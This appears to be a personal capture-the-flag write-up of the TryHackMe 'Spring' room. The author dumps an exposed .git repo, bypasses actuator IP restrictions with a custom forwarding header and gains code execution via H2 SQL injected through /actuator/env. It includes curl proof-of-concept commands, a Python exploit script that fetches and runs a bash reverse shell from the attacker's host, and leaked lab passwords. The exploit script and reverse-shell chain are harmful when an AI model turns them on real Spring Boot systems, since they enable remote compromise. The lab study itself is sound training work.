# Tryhackme.com Room : Spring
`https://tryhackme.com/room/spring`


# Instance
```
export IP=10.10.225.50
```

# Nmap
```

```


Every requests on port `80` redirect us to port `443`.

everything so far return `404` not found. Doesn't seem to be an `index.html` or `index.php` file.

The `404` error look like a tomcat error tho. The name of the challenge is `spring` so it might be a java application served via tomcat

Running gobuster, we find some strange redirects:
```
\sources -> \sources\ -> 404
\logout -> \login?logout -> 404
```

Looking at the certificate, we see the name
```
John Smith
```

And the host `spring.thm`. Let's put this into our host file and see if we get better luck

The certificate mention subdomains, let's try to fuzz the subdomains

```
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.spring.thm" -u https://spring.thm -t 100
```

```
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 --hl 0 -u https://FUZZ.spring.thm -t 100 -L -Z
```

Playing around with `wfuzz` I found that I can get a 500 error with `curl -v https://spring.thm/examples/%2e%2e/manager/html -k`.

I was poking around but couldn't find anything. I took a look at a writeup and they were using `dirsearch` to do the enumeration instead of `gobuster`
```
./dirsearch.py -u https://spring.thm/ -t 200 -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -R 5
```

This tool is pretty cool, it will automatically check inside folders if it find folders.
Didn't realise before this but the redirection `\sources -> \sources\` actually signify that that this is an existing folder.

We then find a `\sources\new` folder. And then is the tricky part. The `.git` entry is not in `directory-list-2.3-medium.txt` (Quite stupid, i just added it there).

We can find a `git` repo in `\sources\new\.git\`. We use `https://github.com/arthaud/git-dumper` to retrieve the git repo.

We now have all the code.

Looking in the code we find that the `\` page take a `?name` get parameter

```java
@RequestMapping("/")
public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
    System.out.println(name);
    return String.format("Hello, %s!", name);
}
```

Seems like there is some `ip` authentication on `/actuator`
```java
@Configuration
    @EnableWebSecurity
    static class SecurityConfig extends WebSecurityConfigurerAdapter {

        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")
                    .and().csrf().disable();
        }

    }
```

Bunch of stuff related to tomcat :
```java
@Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint securityConstraint = new SecurityConstraint();
                securityConstraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                securityConstraint.addCollection(collection);
                context.addConstraint(securityConstraint);
                context.setUseHttpOnly(true);
            }

            @Override
            protected TomcatWebServer getTomcatWebServer(Tomcat tomcat) {
                Context context = tomcat.addContext("/sources", "/opt/spring/sources/");
                context.setParentClassLoader(getClass().getClassLoader());
                context.setUseHttpOnly(true);

                Wrapper defaultServlet = context.createWrapper();
                defaultServlet.setName("default");
                defaultServlet.setServletClass("org.apache.catalina.servlets.DefaultServlet");
                defaultServlet.addInitParameter("debug", "0");
                defaultServlet.addInitParameter("listings", "false");
                defaultServlet.setLoadOnStartup(1);
                defaultServlet.setOverridable(true);
                context.addChild(defaultServlet);
                context.addServletMappingDecoded("/", "default");

                return super.getTomcatWebServer(tomcat);
            }
        };
        factory.addAdditionalTomcatConnectors(redirectConnector());
        return factory;
    }
```

Not sure what to make of this.

Looking into config files `src/main/resources/application.properties` we find
```
spring.security.user.name=johnsmith
spring.security.user.password=PrettyS3cureSpringPassword123.
management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart
server.ssl.key-store=classpath:dummycert.p12
server.ssl.key-store-password=DummyKeystorePassword123.
server.ssl.keyStoreType=PKCS12
```

We also got the `p12` certificate

If we checkout the previous commit we find 
```
spring.security.user.name=johnsmith
spring.security.user.password=idontwannag0
```

When browsing `/actuator` we see that we have a cookie :
```
JSESSIONID=3EE20A0A0C0FFFDEFA65F0B6FA676541;
```

Soo after a poking around for a while, I see why `/actuator` is blocked. It's where `/actuator/health, /actuator/info` etc are. We can probably exploit these

We need an ip like `hasIpAddress("172.16.0.0/24")`... Tried `curl --header "X-Forwarded-For: 172.16.0.3"` but nopppp.

Hmm, I guess we need the server to somehow call itself on those endpoints ? idk

Btw, haven't mentioned it yet but we need an ssh key to connect. We can't try the credentials found.

Also, here is a diff of the 2 commits available in the dump :
```diff
diff --git a/src/main/java/com/onurshin/spring/Application.java b/src/main/java/com/onurshin/spring/Application.java
index fee60ff..e49a401 100644
--- a/src/main/java/com/onurshin/spring/Application.java
+++ b/src/main/java/com/onurshin/spring/Application.java
@@ -18,6 +18,7 @@ import org.springframework.security.config.annotation.web.builders.HttpSecurity;
 import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
 import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
 import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
 
 @SpringBootApplication(exclude = {ErrorMvcAutoConfiguration.class})
@@ -28,10 +29,12 @@ public class Application {
     }
 
     @RestController
+    //https://spring.io/guides/gs/rest-service/
     static class HelloWorldController {
         @RequestMapping("/")
-        public String hello() {
-            return "Hello WORLD";
+        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
+            System.out.println(name);
+            return String.format("Hello, %s!", name);
         }
     }
 
@@ -57,8 +60,6 @@ public class Application {
                 securityConstraint.addCollection(collection);
                 context.addConstraint(securityConstraint);
                 context.setUseHttpOnly(true);
-
-                System.out.println(context.findChild("default"));
             }
 
             @Override
diff --git a/src/main/resources/application.properties b/src/main/resources/application.properties
index ccf5992..71e1811 100644
--- a/src/main/resources/application.properties
+++ b/src/main/resources/application.properties
@@ -12,7 +12,7 @@ spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.
 server.servlet.register-default-servlet=true
 spring.mvc.ignore-default-model-on-redirect=true
 spring.security.user.name=johnsmith
-spring.security.user.password=idontwannag0
+spring.security.user.password=PrettyS3cureSpringPassword123.
 debug=false
 spring.cloud.config.uri=
 spring.cloud.config.allow-override=true
```

We can insert html and js in the `/?name` page but.. doesn't get us anywhere...

In `build.graddle` we see
```java
dependencyManagement {
    imports {
        mavenBom "org.springframework.cloud:spring-cloud-dependencies:${springCloudVersion}"
    }
}
```

Maybe we can inject an environment variable later ?

Looking at a write up brought my attention to 
`server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04` in `applications.properties`

Searching for this, we see that it replace the `x-forwarded-for` header. 
We can then use `curl --header "x-9ad42dea0356cb04: 172.16.0.3"  https://spring.thm/actuator -k -v` and we get a response !
```
{
	_links: {
	self: {
	href: "https://spring.thm/actuator",
	templated: false
	},
	beans: {
	href: "https://spring.thm/actuator/beans",
	templated: false
	},
	health: {
	href: "https://spring.thm/actuator/health",
	templated: false
	},
	health-path: {
	href: "https://spring.thm/actuator/health/{*path}",
	templated: true
	},
	shutdown: {
	href: "https://spring.thm/actuator/shutdown",
	templated: false
	},
	env-toMatch: {
	href: "https://spring.thm/actuator/env/{toMatch}",
	templated: true
	},
	env: {
	href: "https://spring.thm/actuator/env",
	templated: false
	},
	mappings: {
	href: "https://spring.thm/actuator/mappings",
	templated: false
	},
	restart: {
	href: "https://spring.thm/actuator/restart",
	templated: false
	}
	}
}
```

We use the `ModHeader` chrome extension to set the forward header inside the browser. It's easier to browse around.

from `/env`
```
catalina.home:  "/tmp/tomcat.4725898427114420142.443"

sun.java.command: "/opt/spring/sources/new/spring-0.0.1-SNAPSHOT.jar --server.ssl.key-store=/opt/privcert.p12 --server.ssl.key-store-password=PrettyS3cureKeystorePassword123."

USER: "nobody"

SUDO_COMMAND: "/bin/su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -Djava.security.egd=file:///dev/urandom -jar /opt/spring/sources/new/spring-0.0.1-SNAPSHOT.jar --server.ssl.key-store=/opt/privcert.p12 --server.ssl.key-store-password=PrettyS3cureKeystorePassword123."
```


I found this guide `https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database` which exploit the `/actuators/env` endpoint to get RCE.

We set the env variable `spring.datasource.hikari.connection-test-query` to an `SQL` statement :
```
CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException',HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);',HEXTORAW('007d'));CALL EXEC('whoami');
```

Then for the command to be executed we need to restart the server with a `POST` to `/actuator/restart`

Here is a proof of concept:
```
curl -H "Content-Type: application/json" -H "x-9ad42dea0356cb04: 172.16.0.3" -X POST -d "{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('curl  http://10.6.32.20:8000/phone_home');\"}" https://spring.thm/actuator/env/ -k -v
```

```
curl -H "x-9ad42dea0356cb04: 172.16.0.3" -X POST https://spring.thm/actuator/restart/ -k -v
```

I wasn't able to embed a revshell directly in the command. I tried different methods (bash, python, nc, ...) but none seemed to work.
I settled for a 2 step approach of uploading a shell script with our revshell and calling it.

I've written this small python script to automate the process:
```py
import requests
import subprocess
import time
import os
import signal
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

our_ip = "10.6.32.20"
revshell_port = "7777"
url = "https://spring.thm"

def prepare_exploit_file():
    with open('rev.sh', 'w') as f:
        f.write('#!/bin/bash\n')
        f.write(f"bash -c 'bash -i >& /dev/tcp/{our_ip}/{revshell_port} 0>&1'\n")

    # Start http server so we can server rev.sh
    p = subprocess.Popen('python3 -m http.server', shell=True)
    return p


def run_cmd(cmd):
    data = {
        'name': 'spring.datasource.hikari.connection-test-query',
        'value': f"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException {{ java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {{return s.next();}} throw new IllegalArgumentException(); }}');CALL EXEC('{cmd}');"
    }

    headers = {
        'x-9ad42dea0356cb04': '172.16.0.3'
    }

    print(f"Inserting cmd : {cmd}")
    r = requests.post(f"{url}/actuator/env", json=data, headers=headers, verify=False)

    r = requests.post(f"{url}/actuator/restart", headers=headers, verify=False)
    print(r.text)
    print("Command executed")

def kill_server(process, filename="rev.sh"):
    if os.path.exists(filename):
        os.remove(filename)

    os.killpg(os.getpgid(process.pid), signal.SIGTERM) 
        

if __name__ == "__main__":
    #subprocess.check_output('bash -c \'pgrep -f "python3 -m http.server" | xargs kill\'', shell=True)
    cmd1 = f"curl http://{our_ip}:8000/rev.sh -o /tmp/rev.sh"
    cmd2 = f"/bin/bash /tmp/rev.sh"
    http_server_process = prepare_exploit_file()
    run_cmd(cmd1)

    print("uploaded script.. Waiting 5 sec")
    time.sleep(5)
    run_cmd(cmd2)

    time.sleep(5)
    kill_server(http_server_process)

```

And we get a revshell.
We see `/home/johnsmith/user.txt` but we can't access it

Now I was a bit lazy and I took a shortcut.. The tryhackme page mention a `foothold.txt` so I just `find / -name foothold.txt 2>/dev/null` and found it in `/opt/foothold.txt`
```
THM{dont_expose_.git_to_internet}
```

The spring code is in `/opt/spring` (We knew that from the source code, could have found `foothold.txt` without searching)

Now we can try to `su johnsmith` with the passwords we found earlier... NOP doesn't work

We can't access `/home/johnsmith/.ssh` either

Doesn't seem to be anormal SGID binaries (`find / -perm -4000 2>/dev/null`)

There is a `tomcatlogs` folder in `/home/johnsmith` that belong to `johnsmith`. It contains errors related to our execution.

Looking at the `/tmp/rev.sh` file that we uploaded. It belong to `nobody` so the command is not executed by `johnsmith`. Only `tomcat` seems to be runned by `johnsmith`.

Hmmm we got to find a way for `tomcat` to execute some code.

Let's list the open ports on the box with `netstat -tulpn | grep LISTEN`. Maybe we can access tomcat locally ?
```
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -      
```

No `443` ? Weird..

`127.0.0.53:53` might be a `DNS` server ? Might be some way to exploit this ? Need more scanning.
We could use `chisel` to create a reverse tunnel and scan this ip.
Yeahh.. `Linpeas` show that it's indeed the dns server.

Maybe we can change the `.jar` file in `/opt/spring` with a malicious payload ? Would this be runned by tomcat ? Can we exploit this ?